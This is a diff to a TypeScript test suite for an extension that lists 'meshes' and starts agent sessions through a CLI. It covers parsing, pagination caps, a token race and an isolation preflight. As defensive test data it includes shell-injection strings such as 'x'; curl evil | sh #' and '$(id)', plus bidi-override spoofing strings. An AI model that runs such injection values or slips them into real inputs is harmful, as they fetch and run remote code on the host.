@@ -10,11 +10,12 @@ import * as ext from "../../extension";
 import * as api from "../../api";
 import { LoginRequest, SECRET_KEY } from "../../auth";
 import {
-  BACKOFF_CAP_MS, cellDescription, isolationText, osText, statusText, cellTooltip, detect, isTierCWindows, lastSeenText, listMeshes, listMyCells, Machine, MAX_PAGES, Mesh,
+  BACKOFF_CAP_MS, cellDescription, isMine, isolationText, oneLine, osText, safeScope, startable, statusText, cellTooltip, detect, isTierCWindows, lastSeenText, listMeshes, listMyCells, Machine, MAX_PAGES, Mesh,
   MESH_TEXTS, MeshLoader, meshesPageUrl, meshInviteUrl, meshLaunchArgs, meshPageUrl, meshTree, parseCell, parseMachine, parseMesh, POLL_MS,
   PROBE_RETRY_MS, retryAfterMs, suggestCellName, Timers, validateCellName, VisibilityPoller,
 } from "../../meshApi";
 import { CellItem, MachineItem, MeshItem, MESHES_AVAILABLE } from "../../meshesView";
+import { parsePreflight, preflightArgs, reducedWarning } from "../../meshApi";
 import { commandLine } from "../../terminalCommand";
 import type { CliLookup } from "../../cli";
 
@@ -28,14 +29,16 @@ const B = `msh_${"b".repeat(32)}`;
 const E = `msh_${"e".repeat(32)}`;
 const OTHER = `msh_${"f".repeat(32)}`;
 const OLD = `msh_${"0".repeat(32)}`;
+const NM = `msh_${"9".repeat(32)}`;
 
 // ---- fixtures: the pinned contract ----------------------------------------------------------------
 
 const MESHES = { meshes: [
-  { mesh_id: A, name: "Alpha team", role: "owner", status: "active", archived: false, member_count_bucket: "2-5" },
-  { mesh_id: B, name: "Beta", role: "member", status: "active", archived: false, member_count_bucket: "1" },
-  { mesh_id: E, name: "Empty mesh", role: "member", status: "active", archived: false, member_count_bucket: "1" },
-  { mesh_id: OLD, name: "Old project", status: "archived", archived: false, member_count_bucket: "1" },
+  { mesh_id: A, name: "Alpha team", role: "owner", status: "active", member_count_bucket: "2-5" },
+  { mesh_id: B, name: "Beta", role: "member", status: "active", member_count_bucket: "1" },
+  { mesh_id: E, name: "Empty mesh", role: "admin", status: "active", member_count_bucket: "1" },
+  { mesh_id: OLD, name: "Old project", role: "owner", status: "archived", archived_at: "2026-10-20T08:00:00Z", member_count_bucket: "1" },
+  { mesh_id: NM, name: "Public directory", status: "active", member_count_bucket: "50+" },
 ], next_cursor: null };
 
 const cell = (over: Record<string, unknown>) => ({
@@ -131,14 +134,14 @@ function fakeClock(start = NOW) {
   };
 }
 
-function loaderWith(routes: Record<string, Answer[]>, opts: { base?: () => string; token?: string | undefined } = {}) {
+function loaderWith(routes: Record<string, Answer[]>, opts: { base?: () => string; token?: string | undefined; tokenFn?: () => string | undefined } = {}) {
   const net = fakeFetch(routes);
   const clock = fakeClock();
-  const log = { available: [] as boolean[], changed: 0, unauthorized: 0 };
+  const log = { available: [] as boolean[], changed: 0, unauthorized: 0, unauthorizedWith: [] as string[] };
   const loader = new MeshLoader({
     client: () => clientWith(net.fetch, opts.base ? opts.base() : BASE),
-    token: async () => ("token" in opts ? opts.token : TOKEN),
-    unauthorized: async () => { log.unauthorized++; },
+    token: async () => (opts.tokenFn ? opts.tokenFn() : "token" in opts ? opts.token : TOKEN),
+    unauthorized: async (t: string) => { log.unauthorized++; log.unauthorizedWith.push(t); },
     available: (v) => log.available.push(v),
     changed: () => { log.changed++; },
     now: clock.now,
@@ -199,10 +202,13 @@ describe("meshes: the pinned contract", () => {
   it("parses GET /meshes and GET /me/mesh/cells exactly, with the key as a Bearer header", async () => {
     const net = fakeFetch({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
     const c = clientWith(net.fetch);
-    const meshes = await listMeshes(c, TOKEN);
-    assert.deepStrictEqual(meshes[0], { id: A, name: "Alpha team", role: "owner", status: "active", archived: false, memberCountBucket: "2-5" });
-    assert.deepStrictEqual(meshes.map((m) => m.archived), [false, false, false, true]);
-    const machines = await listMyCells(c, TOKEN);
+    const paged = await listMeshes(c, TOKEN);
+    assert.strictEqual(paged.truncated, false);
+    const meshes = paged.items;
+    assert.deepStrictEqual(meshes[0], { id: A, name: "Alpha team", role: "owner", status: "active", archivedAt: undefined, memberCountBucket: "2-5" });
+    assert.deepStrictEqual(meshes.map((m) => [m.status, m.role]), [["active", "owner"], ["active", "member"], ["active", "admin"], ["archived", "owner"], ["active", undefined]]);
+    assert.strictEqual(meshes[3].archivedAt, "2026-10-20T08:00:00Z");
+    const machines = (await listMyCells(c, TOKEN)).items;
     assert.deepStrictEqual(machines.map((m) => [m.keyId, m.binding, m.revoked, m.cells.length]), [
       ["k_laptop", "pinned", false, 3], ["k_win", "pairing", false, 1], ["k_old", "pinned", true, 1], ["k_other", "pinned", false, 1],
     ]);
@@ -219,7 +225,7 @@ describe("meshes: the pinned contract", () => {
   });
 
   it("an enum value outside the contract shows as 'unknown': free text never shows as a kind", () => {
-    const c = parseCell(cell({ presence: "WIN-DESK", status: HOSTNAME, isolation: "tier-c", os: "10.0.0.7", reach: ["lan", "203.0.113.9:443", "lan"], client_version: "1.0; rm" }))!;
+    const c = parseCell(cell({ presence: "WIN-DESK", status: HOSTNAME, isolation: "sandboxed", os: "10.0.0.7", reach: ["lan", "203.0.113.9:443", "lan"], client_version: "1.0; rm" }))!;
     assert.deepStrictEqual([c.presence, c.status, c.isolation, c.os, c.reach, c.clientVersion], ["unknown", "unknown", "unknown", "unknown", ["lan", "unknown"], undefined]);
     assert.deepStrictEqual(parseCell(cell({ reach: "lan" }))!.reach, ["unknown"]);
     assert.deepStrictEqual(parseCell(cell({ presence: "Online" }))!.presence, "unknown", "case matters");
@@ -227,8 +233,8 @@ describe("meshes: the pinned contract", () => {
       assert.strictEqual(parseCell(cell({ presence: p }))!.presence, p);
     }
     assert.strictEqual(parseMachine({ key_id: "k", binding: "wifi" })!.binding, "unknown");
-    const m = parseMesh({ mesh_id: A, role: "root", status: "paused", member_count_bucket: "lots of people" })!;
-    assert.deepStrictEqual([m.role, m.status, m.memberCountBucket, m.archived], [undefined, "unknown", undefined, false]);
+    const m = parseMesh({ mesh_id: A, role: "root", status: "frozen", member_count_bucket: "lots of people" })!;
+    assert.deepStrictEqual([m.role, m.status, m.memberCountBucket], [undefined, "unknown", undefined]);
     assert.ok(!cellDescription(parseCell(cell({ presence: HOSTNAME, status: HOSTNAME, reach: [HOSTNAME] }))!, NOW).includes("corp"));
   });
 
@@ -241,10 +247,10 @@ describe("meshes: the pinned contract", () => {
     };
     keeps("status", ["active", "revoked", "pending"]);
     keeps("isolation", ["sandbox", "uid", "reduced"]);
-    keeps("os", ["linux", "wsl", "windows", "macos-reserved"]);
+    keeps("os", ["linux", "wsl", "windows"]);
     keeps("presence", ["online", "idle", "busy", "away", "offline"]);
-    for (const old of ["running", "stopped", "tier-a", "tier-c", "macos", "darwin"]) {
-      assert.ok(Object.values(parseCell(cell({ status: old, isolation: old, os: old }))!).filter((v) => v === "unknown").length === 3, old);
+    for (const other of ["Active", "LINUX", "uid ", "sandbox\u200b", HOSTNAME]) {
+      assert.ok(Object.values(parseCell(cell({ status: other, isolation: other, os: other }))!).filter((v) => v === "unknown").length === 3, other);
     }
     assert.deepStrictEqual(parseCell(cell({ reach: ["lan", "public", "via", "wan"] }))!.reach, ["lan", "public", "via", "unknown"]);
     for (const b of ["pairing", "pinned"]) {
@@ -254,7 +260,9 @@ describe("meshes: the pinned contract", () => {
       assert.strictEqual(parseMesh({ mesh_id: A, role: r })!.role, r);
     }
     assert.strictEqual(parseMesh({ mesh_id: A })!.role, undefined, "no role for non-members");
-    assert.strictEqual(parseMesh({ mesh_id: A, status: "active" })!.status, "active");
+    for (const st of ["active", "archived", "merged", "deleted"]) {
+      assert.strictEqual(parseMesh({ mesh_id: A, status: st })!.status, st);
+    }
   });
 
   it("os absent or null shows nothing (not 'unknown'); an unlisted os shows 'unknown'", () => {
@@ -264,7 +272,6 @@ describe("meshes: the pinned contract", () => {
       assert.ok(!cellTooltip(c, parseMachine({ key_id: "k" })!, NOW).includes("OS:"));
     }
     assert.strictEqual(osText(parseCell(cell({ os: "beos" }))!), "unknown");
-    assert.strictEqual(osText(parseCell(cell({ os: "macos-reserved" }))!), "macos");
     assert.strictEqual(osText(parseCell(cell({ os: "wsl" }))!), "wsl");
   });
 
@@ -276,13 +283,26 @@ describe("meshes: the pinned contract", () => {
     assert.strictEqual(isolationText(parseCell(cell({ isolation: "sandbox" }))!), "tier a (sandbox), self-reported");
     assert.strictEqual(isolationText(parseCell(cell({ isolation: "uid" }))!), "tier b (uid), self-reported");
     assert.strictEqual(isolationText(parseCell(cell({ isolation: "reduced" }))!), "tier c (reduced), self-reported");
-    assert.strictEqual(isolationText(parseCell(cell({ isolation: "tier-c" }))!), "unknown");
+    assert.strictEqual(isolationText(parseCell(cell({ isolation: "none" }))!), "unknown");
   });
 
-  it("a mesh is archived by either signal: archived: true or status: archived", () => {
-    assert.strictEqual(parseMesh({ mesh_id: A, archived: true, status: "active" })!.archived, true);
-    assert.strictEqual(parseMesh({ mesh_id: A, archived: false, status: "archived" })!.archived, true);
-    assert.strictEqual(parseMesh({ mesh_id: A, archived: false, status: "active" })!.archived, false);
+  it("archived means status 'archived' (no boolean); Start only in an active mesh of mine", () => {
+    assert.strictEqual(parseMesh({ mesh_id: A, role: "owner", archived: true, status: "active" })!.status, "active", "an archived flag is ignored");
+    assert.ok(!("archived" in parseMesh({ mesh_id: A, archived: true })!));
+    for (const st of ["archived", "merged", "deleted", "frozen"]) {
+      assert.strictEqual(startable(parseMesh({ mesh_id: A, role: "owner", status: st })!), false, st);
+    }
+    assert.strictEqual(startable(parseMesh({ mesh_id: A, role: "member", status: "active" })!), true);
+    assert.strictEqual(startable(parseMesh({ mesh_id: A, status: "active" })!), false, "a non-member card");
+    assert.strictEqual(isMine(parseMesh({ mesh_id: A, status: "active" })!), false);
+  });
+
+  it("oneLine strips C0/C1 controls, bidi overrides and isolates, and zero-width characters", () => {
+    assert.strictEqual(oneLine("evil\u202egnp.exe"), "evilgnp.exe");
+    assert.strictEqual(oneLine("a\u2066b\u2069c\u200bd\u200de\u2060f\ufeffg\u200fh\u061ci"), "abcdefghi");
+    assert.strictEqual(oneLine("x\u0085y\u009bz\u0007w"), "x y z w");
+    assert.strictEqual(oneLine("\u200b\u202e"), undefined);
+    assert.strictEqual(parseMesh({ mesh_id: A, name: "Team\u202eA" })!.name, "TeamA");
   });
 
   it("a mesh id that isn't exactly msh_ + 32 hex is dropped (cards and cells); so is a machine without key_id", () => {
@@ -298,7 +318,7 @@ describe("meshes: the pinned contract", () => {
     const net = fakeFetch({ "GET /meshes": [
       ok({ meshes: [MESHES.meshes[0]], next_cursor: "c 2/x" }), ok({ meshes: [MESHES.meshes[1]], next_cursor: "c3" }), ok({ meshes: [MESHES.meshes[2]], next_cursor: null }),
     ] });
-    assert.deepStrictEqual((await listMeshes(clientWith(net.fetch), TOKEN)).map((m) => m.id), [A, B, E]);
+    assert.deepStrictEqual((await listMeshes(clientWith(net.fetch), TOKEN)).items.map((m) => m.id), [A, B, E]);
     assert.deepStrictEqual(paths(net.seen), ["/meshes", "/meshes?cursor=c%202%2Fx", "/meshes?cursor=c3"]);
   });
 
@@ -308,8 +328,10 @@ describe("meshes: the pinned contract", () => {
     assert.strictEqual(loop.seen.length, 2);
     let n = 0;
     const endless = fakeFetch({ "GET /meshes": [() => Promise.resolve(ok({ meshes: [], next_cursor: `c${n++}` }))] });
-    await listMeshes(clientWith(endless.fetch), TOKEN);
+    const capped = await listMeshes(clientWith(endless.fetch), TOKEN);
     assert.strictEqual(endless.seen.length, MAX_PAGES);
+    assert.strictEqual(capped.truncated, true);
+    assert.strictEqual((await listMyCells(clientWith(loop.fetch), TOKEN)).truncated, false, "a repeated cursor isn't truncation");
   });
 
   it("a body that isn't the shape is 'bad-response'", async () => {
@@ -388,6 +410,14 @@ describe("meshes: feature detection", () => {
     nothingLeaked();
   });
 
+  it("a server's scope string is sanitised before it is shown", async () => {
+    for (const bad of ["mesh:join\nClick here", "<b>x</b>", "mesh:\u202ejoin", "a".repeat(80), "a:b:c:d"]) {
+      const st = await stateOf({ status: 403, body: { error: { code: "scope_denied", details: { required_scope: bad } } } });
+      assert.deepStrictEqual(st, { kind: "denied", message: api.MESSAGES.needsScope("unknown") }, JSON.stringify(bad));
+    }
+    assert.strictEqual(safeScope("profiles:read"), "profiles:read");
+  });
+
   it("view: a 403 naming mesh:join is an error item with Refresh, never a sign-in", async () => {
     const { sb, logins } = await activateWith({ "GET /meshes": [{ status: 403, body: { error: { code: "scope_denied", details: { required_scope: "mesh:join" } } } }] });
     const [item] = await sb.meshes.getChildren();
@@ -417,6 +447,16 @@ describe("meshes: feature detection", () => {
     assert.ok(top.slice(1).every((i) => i.collapsibleState === 0 && !String(i.description).includes("cell")));
   });
 
+  it("view: when the 20-page cap cuts the list, one line says so (and opens the website)", async () => {
+    let n = 0;
+    const page = () => Promise.resolve(ok({ meshes: [MESHES.meshes[0]], next_cursor: `c${n++}` }));
+    const { sb } = await activateWith({ "GET /meshes": [page] });
+    const top = await sb.meshes.getChildren();
+    assert.deepStrictEqual(top.filter((i) => i.label === MESH_TEXTS.truncated).length, 1);
+    assert.strictEqual(top[0].label, MESH_TEXTS.truncated);
+    assert.strictEqual(top[0].command!.command, ext.CMD_OPEN_MESHES);
+  });
+
   it("401: the key is forgotten with one warning, as in My sessions, and the view hides", async () => {
     const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 401 }] });
     await flush();
@@ -424,6 +464,27 @@ describe("meshes: feature detection", () => {
     assert.deepStrictEqual(calls.warnings, [MESH_TEXTS.signedOut]);
     assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
     assert.strictEqual(sb.meshes.loader.retrying, false);
+  });
+});
+
+describe("meshes: 401 and the stored key", () => {
+  beforeEach(resetCalls);
+
+  it("view: a poll's 401 on the old key after a step-up leaves the new key and warns nothing", async () => {
+    let release: (v: { status: number; body?: unknown }) => void = () => undefined;
+    const { sb, ctx } = await activateWith({
+      "GET /meshes": [ok(MESHES), () => new Promise((r) => { release = r; }), ok(MESHES)],
+      "GET /me/mesh/cells": [ok(CELLS)],
+    });
+    const poll = sb.meshes.refresh();
+    await flush();
+    const fresh = JSON.stringify({ token: NEW_TOKEN, server: BASE, id: "t2", scopes: ["library:read", "profiles:read", "library:organize", "mesh:read"] });
+    await ctx.secrets.store(SECRET_KEY, fresh);
+    release({ status: 401 });
+    await poll;
+    await flush();
+    assert.strictEqual(await ctx.secrets.get(SECRET_KEY), fresh, "the stepped-up key survives");
+    assert.deepStrictEqual(calls.warnings, []);
   });
 });
 
@@ -534,6 +595,64 @@ describe("meshes: the loader", () => {
     assert.deepStrictEqual((loader.load as any).meshes, []);
   });
 
+  it("the 20-page cap shows one line in the view", async () => {
+    let n = 0;
+    const page = () => Promise.resolve(ok({ meshes: [MESHES.meshes[0]], next_cursor: `c${n++}` }));
+    const { loader } = loaderWith({ "GET /meshes": [page] });
+    await loader.probe();
+    assert.strictEqual((loader.load as any).truncated, true);
+  });
+
+  it("generations: after a server change, a probe or load asks the new server at once, and the old answer is dropped", async () => {
+    let base = BASE;
+    const releases: ((v: { status: number; body?: unknown }) => void)[] = [];
+    const wait = () => new Promise<{ status: number; body?: unknown }>((r) => { releases.push(r); });
+    const { loader, net } = loaderWith({ "GET /meshes": [wait, ok({ meshes: [MESHES.meshes[1]], next_cursor: null })], "GET /me/mesh/cells": [ok(CELLS)] }, { base: () => base });
+    const old = loader.probe();
+    await flush();
+    const gen = loader.generation;
+    base = "https://other.example.com";
+    await loader.probe();   // not the old request in flight: a new one, to the new server
+    assert.strictEqual(loader.generation, gen + 1);
+    assert.deepStrictEqual(net.seen.map((r) => new URL(r.url).origin), [BASE, "https://other.example.com"]);
+    assert.deepStrictEqual((loader.load as any).meshes.map((m: Mesh) => m.id), [B]);
+    releases[0](ok(MESHES));
+    await old;
+    assert.deepStrictEqual((loader.load as any).meshes.map((m: Mesh) => m.id), [B], "the old server's late answer is dropped");
+    await loader.full();
+    assert.ok(net.seen.slice(2).every((r) => new URL(r.url).origin === "https://other.example.com"));
+  });
+
+  it("generations: a server change resets the backoff and the probe retries of the old server", async () => {
+    let base = BASE;
+    const { loader, clock, net } = loaderWith({ "GET /meshes": [{ status: 429, retryAfter: "300" }, new Error("down"), ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] }, { base: () => base });
+    await loader.tick();
+    await loader.probe();
+    assert.strictEqual(loader.retrying, true);
+    base = "https://other.example.com";
+    await loader.tick();
+    assert.strictEqual(loader.retrying, false, "the old server's retry is cancelled");
+    assert.strictEqual(net.seen.length, 4, "no backoff carried over: the new server is read at once");
+    await clock.advance(PROBE_RETRY_MS[0]);
+    assert.strictEqual(net.seen.length, 4);
+  });
+
+  it("401 race: a 401 for a key a step-up replaced meanwhile is dropped; it never clears the new key", async () => {
+    let current = TOKEN;
+    let release: (v: { status: number; body?: unknown }) => void = () => undefined;
+    const { loader, log } = loaderWith({ "GET /meshes": [() => new Promise((r) => { release = r; }), { status: 401 }] }, { tokenFn: () => current });
+    const late = loader.full(true);
+    await flush();
+    current = NEW_TOKEN;   // the step-up stored a new key while the old request was in flight
+    release({ status: 401 });
+    await late;
+    assert.strictEqual(log.unauthorized, 0);
+    assert.strictEqual(loader.load, undefined, "nothing applied");
+    await loader.full(true);   // a 401 for the key that is still stored does count
+    assert.deepStrictEqual(log.unauthorizedWith, [NEW_TOKEN]);
+    assert.strictEqual(loader.load!.kind, "signed-out");
+  });
+
   it("signed out: no request, hidden", async () => {
     const { loader, net, log } = loaderWith({}, { token: undefined });
     await loader.probe();
@@ -570,7 +689,7 @@ describe("meshes: tree model", () => {
     assert.strictEqual(cellDescription(laptop.cells[2], NOW), "active · online · public+via");
   });
 
-  it("a tier-c Windows host's tooltip says it appears as one machine per mesh", () => {
+  it("a tier c (reduced) Windows host's tooltip says it appears as one machine per mesh", () => {
     const [laptop, win] = machines();
     assert.ok(isTierCWindows(win.cells[0]));
     assert.ok(!isTierCWindows(parseCell(cell({ os: "linux", isolation: "reduced" }))!), "keys on windows + reduced");
@@ -580,7 +699,7 @@ describe("meshes: tree model", () => {
     assert.ok(!cellTooltip(laptop.cells[0], laptop, NOW).includes(MESH_TEXTS.tierCWindows));
   });
 
-  it("the view: mesh → machine → cell across machines, mesh → cell for one, a Start item for none, archived marked", async () => {
+  it("the view: my meshes only; mesh → machine → cell across machines, mesh → cell for one, a Start item for none, inactive marked", async () => {
     const { sb } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
     await show();
     const top = (await sb.meshes.getChildren()) as MeshItem[];
@@ -588,8 +707,10 @@ describe("meshes: tree model", () => {
       ["Alpha team", "3 cells · 1 online", "a4sx.mesh", `mesh:${A}`],
       ["Beta", "1 cell · 1 online", "a4sx.mesh", `mesh:${B}`],
       ["Empty mesh", "no cells", "a4sx.mesh", `mesh:${E}`],
-      ["Old project", "archived · no cells", "a4sx.mesh.archived", `mesh:${OLD}`],
+      ["Old project", "archived · no cells", "a4sx.mesh.inactive", `mesh:${OLD}`],
     ]);
+    assert.ok(!top.some((i) => i.label === "Public directory"), "a non-member card is not one of my meshes");
+    assert.ok(String(top[3].tooltip).includes("Archived: 2026-10-20"));
     assert.ok(String(top[0].tooltip).includes("Members: 2-5"));
     const alpha = (await sb.meshes.getChildren(top[0])) as MachineItem[];
     assert.deepStrictEqual(alpha.map((i) => [i.label, i.description]), [[`laptop (${HOSTNAME})`, "2 cells"], ["WIN-DESK", "1 cell"]]);
@@ -604,6 +725,10 @@ describe("meshes: tree model", () => {
     assert.strictEqual(empty[0].label, MESH_TEXTS.noCells);
     assert.strictEqual(empty[0].command!.command, ext.CMD_START_IN_MESH);
     assert.deepStrictEqual(await sb.meshes.getChildren(top[3]), [], "an archived mesh offers no Start");
+    for (const st of ["merged", "deleted"]) {
+      const item = new MeshItem(meshTree([parseMesh({ mesh_id: A, role: "owner", status: st })!], [])[0], true);
+      assert.deepStrictEqual([item.description, item.contextValue], [`${st} · no cells`, "a4sx.mesh.inactive"]);
+    }
     nothingLeaked();
   });
 
@@ -641,8 +766,8 @@ describe("meshes: console links", () => {
   it("the commands open the pages of the a4sx.serverUrl server; a bad id opens nothing", async () => {
     calls.config["a4sx.serverUrl"] = "https://staging.example.com/ignored/path";
     await activateWith({});
-    const good = new MeshItem(meshTree([parseMesh({ mesh_id: A, name: "A" })!], [])[0], true);
-    const bad = new MeshItem({ mesh: { id: "x/../y", status: "unknown", archived: false }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
+    const good = new MeshItem(meshTree([parseMesh({ mesh_id: A, name: "A", role: "owner", status: "active" })!], [])[0], true);
+    const bad = new MeshItem({ mesh: { id: "x/../y", role: "owner", status: "active" }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
     await calls.commands.get(ext.CMD_OPEN_MESH)!(good);
     await calls.commands.get(ext.CMD_OPEN_MESH)!(bad);
     await calls.commands.get(ext.CMD_REDEEM_INVITE)!();
@@ -656,6 +781,13 @@ describe("meshes: console links", () => {
 describe("meshes: start session in mesh", () => {
   beforeEach(resetCalls);
   const CLI = "/opt/a4sx-test/bin/a4sx";
+  const pfCalls: { cli: string; args: readonly string[] }[] = [];
+  const pf = (tier: string, reason?: string): ext.PreflightRunner => async (cli, args) => {
+    pfCalls.push({ cli, args });
+    return JSON.stringify({ tier, ...(reason ? { reason } : {}) });
+  };
+  const raw = (stdout: string): ext.PreflightRunner => async () => stdout;
+  beforeEach(() => { pfCalls.length = 0; });
   const ROUTES = () => ({ "GET /meshes": [ok(MESHES)] as Answer[], "GET /me/mesh/cells": [ok(CELLS)] as Answer[] });
   async function alphaItem(sb: ext.Sidebar): Promise<MeshItem> {
     await show();
@@ -689,7 +821,7 @@ describe("meshes: start session in mesh", () => {
     const alpha = await alphaItem(sb);
     const before = net.seen.length;
     calls.nextInput = "reviewer";
-    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI)));
+    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")));
     assert.deepStrictEqual(paths(net.seen.slice(before)), ["/meshes"], "preflight: one read");
     assert.deepStrictEqual(calls.terminals[0].options, { name: ext.MESH_TERMINAL_NAME });
     assert.deepStrictEqual(calls.terminals[0].sent, [`'${CLI}' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'reviewer'\n`]);
@@ -702,22 +834,90 @@ describe("meshes: start session in mesh", () => {
     const { sb } = await activateWith(ROUTES());
     const alpha = await alphaItem(sb);
     calls.nextInput = "x'; curl evil | sh #";
-    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI)), undefined);
+    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")), undefined);
     assert.strictEqual(calls.terminals.length, 0);
     assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.nameRule]);
   });
 
-  it("a mesh id that isn't a mesh id, or an archived mesh, starts nothing and sends nothing", async () => {
+  it("a mesh id that isn't a mesh id, an inactive mesh or a non-member card starts nothing and sends nothing", async () => {
     const { sb, net } = await activateWith(ROUTES());
     const before = net.seen.length;
-    const evil = new MeshItem({ mesh: { id: "m'$(id)", status: "unknown", archived: false }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
+    const evil = new MeshItem({ mesh: { id: "m'$(id)", role: "owner", status: "active" }, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
     const archived = new MeshItem(meshTree([parseMesh(MESHES.meshes[3])!], [])[0], true);
+    const notMine = new MeshItem({ mesh: parseMesh(MESHES.meshes[4])!, groups: [], byMachine: false, cellCount: 0, onlineCount: 0 }, true);
     calls.nextInput = "ok";
-    assert.strictEqual(await ext.startSessionInMesh(sb.auth, evil, found(CLI)), undefined);
-    assert.strictEqual(await ext.startSessionInMesh(sb.auth, archived, found(CLI)), undefined);
+    for (const item of [evil, archived, notMine]) {
+      assert.strictEqual(await ext.startSessionInMesh(sb.auth, item, found(CLI), pf("sandbox")), undefined);
+    }
     assert.strictEqual(net.seen.length, before);
+    assert.strictEqual(pfCalls.length, 0);
     assert.strictEqual(calls.terminals.length, 0);
-    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.badMesh, MESH_TEXTS.archived]);
+    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.badMesh, MESH_TEXTS.notActive, MESH_TEXTS.notActive]);
+  });
+
+  it("the CLI preflight: `a4sx launch --mesh <id> --preflight --json` as an argv array; sandbox and uid start directly", async () => {
+    for (const tier of ["sandbox", "uid"]) {
+      resetCalls();
+      pfCalls.length = 0;
+      const { sb } = await activateWith(ROUTES());
+      const alpha = await alphaItem(sb);
+      calls.nextInput = "rev";
+      assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf(tier)), tier);
+      assert.deepStrictEqual(pfCalls, [{ cli: CLI, args: ["launch", "--mesh", A, "--preflight", "--json"] }]);
+      assert.strictEqual(calls.modals.length, 0);
+      assert.ok(!calls.terminals[0].sent[0].includes("--mesh-reduced-isolation"));
+      disposeLater?.subscriptions.forEach((d) => d.dispose());
+      disposeLater = undefined;
+    }
+  });
+
+  it("preflight 'reduced': the spec's warning in a modal; only an explicit click adds --mesh-reduced-isolation, once", async () => {
+    const { sb } = await activateWith(ROUTES());
+    const alpha = await alphaItem(sb);
+    calls.nextInput = "rev";
+    calls.modalChoices.push(undefined);
+    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced", "no bubblewrap in this container")), undefined);
+    assert.strictEqual(calls.modals[0].kind, "warning");
+    assert.strictEqual(calls.modals[0].message, reducedWarning("Alpha team"));
+    assert.ok(calls.modals[0].message.startsWith("Reduced isolation for «Alpha team»: this host can't sandbox your agent"));
+    assert.deepStrictEqual(calls.modals[0].items, [MESH_TEXTS.reducedStart]);
+    assert.strictEqual(calls.terminals.length, 0, "Cancel starts nothing");
+    calls.modalChoices.push(MESH_TEXTS.reducedStart);
+    assert.ok(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced")));
+    assert.deepStrictEqual(calls.terminals[0].sent, [`'${CLI}' 'launch' '--ipc-proxy' '--mesh' '${A}' '--as' 'rev' '--mesh-reduced-isolation'\n`]);
+    calls.modalChoices.push(undefined);
+    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("reduced"));
+    assert.strictEqual(calls.modals.length, 3, "nothing is remembered: every start asks again");
+  });
+
+  it("preflight 'none': refused, with the setup guide; an unreadable answer (an older CLI) starts nothing", async () => {
+    const { sb } = await activateWith(ROUTES());
+    const alpha = await alphaItem(sb);
+    calls.nextErrorChoice = MESH_TEXTS.setupGuide;
+    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("none")), undefined);
+    assert.deepStrictEqual(calls.errors[0], { message: MESH_TEXTS.noTier, items: [MESH_TEXTS.setupGuide] });
+    assert.deepStrictEqual(calls.opened, [`${BASE}${ext.MESH_SETUP_PATH}`]);
+    calls.nextErrorChoice = undefined;
+    for (const out of ["", "usage: a4sx launch [-h] ...\nerror: unrecognized arguments: --preflight", "{\"tier\": \"other\"}", "[]", "{\"tier\": 3}"]) {
+      assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), raw(out)), undefined, out);
+    }
+    assert.deepStrictEqual(calls.errors.slice(1).map((e) => e.message), Array(5).fill(MESH_TEXTS.preflightFailed));
+    assert.strictEqual(calls.inputs.length, 0);
+    assert.strictEqual(calls.terminals.length, 0);
+  });
+
+  it("parsePreflight and preflightArgs", () => {
+    assert.deepStrictEqual(parsePreflight(' {"tier":"uid","reason":"proxy user a4sx-proxy\\u202e"}\n'), { tier: "uid", reason: "proxy user a4sx-proxy" });
+    assert.deepStrictEqual(parsePreflight('{"tier":"none"}'), { tier: "none", reason: undefined });
+    assert.strictEqual(parsePreflight("not json"), undefined);
+    assert.strictEqual(preflightArgs("m;id"), undefined);
+  });
+
+  it("runPreflight uses execFile with an argv array: nothing is read by a shell", async function () {
+    this.timeout(10_000);
+    const out = await ext.runPreflight(process.execPath, ["-e", "process.stdout.write(JSON.stringify(process.argv.slice(1)))", "a; echo pwned $(id) `id`", "--x"]);
+    assert.deepStrictEqual(JSON.parse(out), ["a; echo pwned $(id) `id`", "--x"]);
+    assert.strictEqual(await ext.runPreflight("/nonexistent/a4sx", ["launch"]), "", "a missing program is an empty answer");
   });
 
   it("no CLI: the install hint, no request, no prompt", async () => {
@@ -737,8 +937,8 @@ describe("meshes: start session in mesh", () => {
       "GET /me/mesh/cells": [ok(CELLS)],
     });
     const alpha = await alphaItem(sb);
-    await ext.startSessionInMesh(sb.auth, alpha, found(CLI));
-    await ext.startSessionInMesh(sb.auth, alpha, found(CLI));
+    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox"));
+    await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox"));
     assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.meshGone, api.MESSAGES.needsScope("mesh:read")]);
     assert.strictEqual(calls.inputs.length, 0);
     assert.strictEqual(calls.terminals.length, 0);
@@ -748,7 +948,7 @@ describe("meshes: start session in mesh", () => {
     const { sb } = await activateWith(ROUTES());
     const alpha = await alphaItem(sb);
     calls.nextInput = undefined;
-    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI)), undefined);
+    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found(CLI), pf("sandbox")), undefined);
     assert.strictEqual(await calls.commands.get(ext.CMD_START_IN_MESH)!(), undefined);
